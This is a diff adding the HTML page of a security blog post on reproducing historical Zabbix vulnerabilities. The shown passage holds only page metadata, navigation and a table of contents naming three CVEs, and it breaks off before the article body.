@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" id="favicon-svg" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>Zabbix历史漏洞复现 – Parad0x7e&#39;s Blog</title>
+  <meta name="description" content="Zabbix 是一款功能强大的开源企业级监控解决方案" /><link rel="canonical" href="http://localhost:1313/vul/zabbix%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" />
+
+<meta property="og:title" content="Zabbix历史漏洞复现">
+<meta
+  property="og:description"
+  content="
+    
+      Zabbix 是一款功能强大的开源企业级监控解决方案
+    
+  ">
+<meta
+  property="og:type"
+  content="
+    article
+  ">
+<meta property="og:url" content="http://localhost:1313/vul/zabbix%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><meta property="article:section" content="vul">
+
+<meta
+  property="article:published_time"
+  content="2026-01-26T22:02:26+08:00">
+
+
+<meta
+  property="article:modified_time"
+  content="2026-01-26T22:02:26+08:00">
+
+
+
+  <meta itemprop="name" content="Zabbix历史漏洞复现">
+  <meta itemprop="description" content="Zabbix 是一款功能强大的开源企业级监控解决方案">
+  <meta itemprop="datePublished" content="2026-01-26T22:02:26+08:00">
+  <meta itemprop="dateModified" content="2026-01-26T22:02:26+08:00">
+  <meta itemprop="wordCount" content="250">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Zabbix历史漏洞复现">
+  <meta name="twitter:description" content="Zabbix 是一款功能强大的开源企业级监控解决方案">
+<link href="/css/compiled/main.css" rel="stylesheet" />
+    <link href="/css/variables.css" rel="stylesheet" />
+    <link href="/css/custom.css" rel="stylesheet" />
+
+  
+
+
+  <script>
+    
+
+    function setTheme(theme) {
+      document.documentElement.classList.remove("light", "dark");
+
+      if (theme !== "light" && theme !== "dark") {
+       theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+      }
+
+      document.documentElement.classList.add(theme);
+      document.documentElement.style.colorScheme = theme;
+    }
+
+    setTheme("color-theme" in localStorage ? localStorage.getItem("color-theme") : 'system')
+
+  </script>
+
+  <script>
+    
+
+    if (localStorage.getItem('banner-closed')) {
+      document.documentElement.style.setProperty("--hextra-banner-height", "0px");
+      document.documentElement.classList.add("hextra-banner-hidden");
+    }
+  </script>
+
+  
+  
+  </head>
+<body><div class="hextra-nav-container hx:sticky hx:top-0 hx:z-20 hx:w-full hx:bg-transparent hx:print:hidden">
+  <div
+    class="hextra-nav-container-blur hx:pointer-events-none hx:absolute hx:z-[-1] hx:h-full hx:w-full hx:bg-white hx:dark:bg-dark hx:shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] hx:contrast-more:shadow-[0_0_0_1px_#000] hx:dark:shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] hx:contrast-more:dark:shadow-[0_0_0_1px_#fff]"
+  ></div>
+
+  <nav class="hextra-max-navbar-width hx:mx-auto hx:flex hx:items-center hx:justify-end hx:gap-2 hx:h-16 hx:px-6">
+    <a class="hx:flex hx:items-center hx:hover:opacity-75 hx:ltr:mr-auto hx:rtl:ml-auto" href="/">
+    <img class="hx:mr-2 hx:block hx:dark:hidden" src="/images/logo.svg" alt="Logo" height="20" width="20" />
+    <img class="hx:mr-2 hx:hidden hx:dark:block" src="/images/logo.svg" alt="Dark Logo" height="20" width="20" />
+    <span class="hx:mr-2 hx:font-extrabold hx:inline hx:select-none" title="Parad0x7e&#39;s Blog">Parad0x7e&#39;s Blog</span>
+</a>
+<a
+  title=""
+  href="/arch"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+><span class="hx:text-center">Arch</span>
+</a><a
+  title=""
+  href="/vul"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:font-medium"
+><span class="hx:text-center">Vuln Repro</span>
+</a><a
+  title=""
+  href="/wp"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+><span class="hx:text-center">Write Up</span>
+</a><div class="hextra-search-wrapper hx:relative hx:md:w-64">
+  <div class="hx:relative hx:flex hx:items-center hx:text-gray-900 hx:contrast-more:text-gray-800 hx:dark:text-gray-300 hx:contrast-more:dark:text-gray-300">
+    <input
+      placeholder="搜索文档..."
+      class="hextra-search-input hx:focus:hextra-focus hx:block hx:w-full hx:appearance-none hx:rounded-lg hx:px-3 hx:py-2 hx:transition-colors hx:text-base hx:leading-tight hx:md:text-sm hx:bg-black/[.05] hx:dark:bg-gray-50/10 hx:focus:bg-white hx:dark:focus:bg-dark hx:placeholder:text-gray-500 hx:dark:placeholder:text-gray-400 hx:contrast-more:border hx:contrast-more:border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx:absolute hx:my-1.5 hx:select-none hx:ltr:right-1.5 hx:rtl:left-1.5 hx:h-5 hx:rounded-sm hx:bg-white hx:px-1.5 hx:font-mono hx:text-[10px] hx:font-medium hx:text-gray-500 hx:border hx:border-gray-200 hx:dark:border-gray-100/20 hx:dark:bg-dark/50 hx:contrast-more:border-current hx:contrast-more:text-current hx:contrast-more:dark:border-current hx:items-center hx:gap-1 hx:transition-opacity hx:pointer-events-none hx:hidden hx:sm:flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="hextra-search-results hextra-scrollbar hx:hidden hx:border hx:border-gray-200 hx:bg-white hx:text-gray-100 hx:dark:border-neutral-800 hx:dark:bg-neutral-900 hx:absolute hx:top-full hx:z-20 hx:mt-2 hx:overflow-auto hx:overscroll-contain hx:rounded-xl hx:py-2.5 hx:shadow-xl hx:max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] hx:md:max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx:inset-x-0 hx:ltr:md:left-auto hx:rtl:md:right-auto hx:contrast-more:border hx:contrast-more:border-gray-900 hx:contrast-more:dark:border-gray-50 hx:w-screen hx:min-h-[100px] hx:max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+          <a class="hx:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://github.com/Parad0x7e" title="GitHub"><svg height=24 fill="currentColor" viewBox="3 3 18 18">
+  <path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path>
+</svg>
+<span class="hx:sr-only">GitHub</span>
+          </a><button type="button" aria-label="Menu" class="hextra-hamburger-menu hx:cursor-pointer hx:-mr-2 hx:rounded-sm hx:p-2 hx:active:bg-gray-400/20 hx:md:hidden"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class="hx:mx-auto hx:flex hextra-max-page-width">
+    <aside class="hextra-sidebar-container hx:flex hx:flex-col hx:print:hidden hx:md:top-16 hx:md:shrink-0 hx:md:w-64 hx:md:self-start hx:max-md:[transform:translate3d(0,-100%,0)] hx:md:hidden hx:xl:block">
+  
+  <div class="hx:px-4 hx:pt-4 hx:md:hidden">
+    <div class="hextra-search-wrapper hx:relative hx:md:w-64">
+  <div class="hx:relative hx:flex hx:items-center hx:text-gray-900 hx:contrast-more:text-gray-800 hx:dark:text-gray-300 hx:contrast-more:dark:text-gray-300">
+    <input
+      placeholder="搜索文档..."
+      class="hextra-search-input hx:focus:hextra-focus hx:block hx:w-full hx:appearance-none hx:rounded-lg hx:px-3 hx:py-2 hx:transition-colors hx:text-base hx:leading-tight hx:md:text-sm hx:bg-black/[.05] hx:dark:bg-gray-50/10 hx:focus:bg-white hx:dark:focus:bg-dark hx:placeholder:text-gray-500 hx:dark:placeholder:text-gray-400 hx:contrast-more:border hx:contrast-more:border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx:absolute hx:my-1.5 hx:select-none hx:ltr:right-1.5 hx:rtl:left-1.5 hx:h-5 hx:rounded-sm hx:bg-white hx:px-1.5 hx:font-mono hx:text-[10px] hx:font-medium hx:text-gray-500 hx:border hx:border-gray-200 hx:dark:border-gray-100/20 hx:dark:bg-dark/50 hx:contrast-more:border-current hx:contrast-more:text-current hx:contrast-more:dark:border-current hx:items-center hx:gap-1 hx:transition-opacity hx:pointer-events-none hx:hidden hx:sm:flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="hextra-search-results hextra-scrollbar hx:hidden hx:border hx:border-gray-200 hx:bg-white hx:text-gray-100 hx:dark:border-neutral-800 hx:dark:bg-neutral-900 hx:absolute hx:top-full hx:z-20 hx:mt-2 hx:overflow-auto hx:overscroll-contain hx:rounded-xl hx:py-2.5 hx:shadow-xl hx:max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] hx:md:max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx:inset-x-0 hx:ltr:md:left-auto hx:rtl:md:right-auto hx:contrast-more:border hx:contrast-more:border-gray-900 hx:contrast-more:dark:border-gray-50 hx:w-screen hx:min-h-[100px] hx:max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+  </div>
+  <div class="hextra-scrollbar hx:overflow-y-auto hx:overflow-x-hidden hx:p-4 hx:grow hx:md:h-[calc(100vh-var(--navbar-height)-var(--menu-height))]">
+    <ul class="hx:flex hx:flex-col hx:gap-1 hx:md:hidden">
+      
+      
+          <li class=""><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/wp/"
+    
+  >Wp
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/wp/ilovectf2025-wp/"
+    
+  >?CTF2025 WP
+    </a>
+              
+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/wp/newstarctf2025-wp/"
+    
+  >NewStarCTF2025 WP
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class="open"><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/vul/"
+    
+  >Vul
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col open"><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hextra-sidebar-active-item hx:bg-primary-100 hx:font-semibold hx:text-primary-800 hx:contrast-more:border hx:contrast-more:border-primary-500 hx:dark:bg-primary-400/10 hx:dark:text-primary-600 hx:contrast-more:dark:border-primary-500"
+    href="/vul/zabbix%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+    
+  >Zabbix历史漏洞复现
+    </a>
+  
+    <ul class='hx:flex hx:flex-col hx:gap-1 hx:relative hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:dark:before:bg-neutral-800 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:pr-3 hx:rtl:before:right-0 hx:ltr:ml-3 hx:rtl:mr-3'><li>
+              <a
+                href="#%e4%bb%8b%e7%bb%8d"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >介绍</a>
+            </li>
+          <li>
+              <a
+                href="#zabbix-server-active-proxy-trapper-%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%e4%bf%ae%e5%a4%8d%e7%bb%95%e8%bf%87cve-2020-11800"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Zabbix Server Active Proxy Trapper 命令注入漏洞修复绕过（CVE-2020-11800）</a>
+            </li>
+          <li>
+              <a
+                href="#zabbix-server-active-proxy-trapper-%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9ecve-2017-2824"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Zabbix Server Active Proxy Trapper 命令注入漏洞（CVE-2017-2824）</a>
+            </li>
+          <li>
+              <a
+                href="#zabbix-latestphp-sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9ecve-2016-10134"
+                class="hx:flex hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [word-break:break-word] hx:cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:contrast-more:border hx:gap-2 hx:before:opacity-25 hx:before:content-['#'] hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:text-gray-900 hx:contrast-more:dark:text-gray-50 hx:contrast-more:border-transparent hx:contrast-more:hover:border-gray-900 hx:contrast-more:dark:hover:border-gray-50"
+              >Zabbix latest.php SQL注入漏洞（CVE-2016-10134）</a>
+            </li>
+          </ul>
+  
+              
+            </li><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/vul/jenkins%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+    
+  >Jenkins历史漏洞复现
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/arch/"
+    
+  >Arch
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></span>
+    </a><div class="hx:ltr:pr-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><a
+    class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+    href="/arch/%E5%9C%A8ubuntu%E4%B8%AD%E5%BD%BB%E5%BA%95%E5%88%A0%E9%99%A4snap/"
+    
+  >在Ubuntu中彻底删除SNAP
+    </a>
+              
+            </li></ul>
+      </div></li>
+    </ul>
+
+    <div class="hx:max-xl:hidden hx:h-0 hx:w-64 hx:shrink-0"></div></div>
+  
+  </aside>
+    
+<nav class="hextra-toc hx:order-last hx:hidden hx:w-64 hx:shrink-0 hx:xl:block hx:print:hidden hx:px-4" aria-label="table of contents">
+    <div class="hextra-scrollbar hx:sticky hx:top-16 hx:overflow-y-auto hx:pr-4 hx:pt-6 hx:text-sm [hyphens:auto] hx:max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] hx:ltr:-mr-4 hx:rtl:-ml-4"><p class="hx:mb-4 hx:font-semibold hx:tracking-tight">此页上</p><ul>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e4%bb%8b%e7%bb%8d">介绍
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#zabbix-server-active-proxy-trapper-%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%e4%bf%ae%e5%a4%8d%e7%bb%95%e8%bf%87cve-2020-11800">Zabbix Server Active Proxy Trapper 命令注入漏洞修复绕过（CVE-2020-11800）
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e9%9d%b6%e5%9c%ba%e6%90%ad%e5%bb%ba">靶场搭建
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86">漏洞原理
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0">漏洞复现
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e5%a4%8d">如何修复
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#zabbix-server-active-proxy-trapper-%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9ecve-2017-2824">Zabbix Server Active Proxy Trapper 命令注入漏洞（CVE-2017-2824）
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e9%9d%b6%e5%9c%ba%e6%90%ad%e5%bb%ba-1">靶场搭建
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
